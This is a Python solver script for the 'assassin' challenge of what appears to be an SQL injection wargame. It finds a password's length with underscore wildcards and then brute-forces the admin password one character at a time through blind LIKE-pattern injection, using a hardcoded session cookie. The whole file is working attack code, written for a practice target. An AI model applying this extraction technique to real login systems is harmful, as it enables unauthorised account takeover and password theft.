import requests
from string import ascii_letters, digits

string = ascii_letters + digits
url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookie = {"PHPSESSID":"tibb2rs3ofa7rjdogjml4vbvd6"}

def GET(params, msg = "Hello "):
    html = requests.get(url, params, cookies = cookie).text
    if html.find(msg) > 0:
        return html
    else:
        return False

length = 0
while True:
    if GET({"pw" : '_' * length}): break
    else: length += 1

pw = ""
tmp = None
for i in range(length-1, -1, -1):
    print(i)
    if tmp and len(pw)+1 == 7 - i:
        pw += tmp
        tmp = None
    for s in string:
        html = GET({"pw" : f"{pw}{s}{i*'_'}"})
        if html:
            if html.find("Hello admin") > 0:
                pw += s
                break
            elif html.find("Hello guest") > 0:
                tmp = s

if GET({"pw" : pw}, "Clear!"): print("[*] Success")
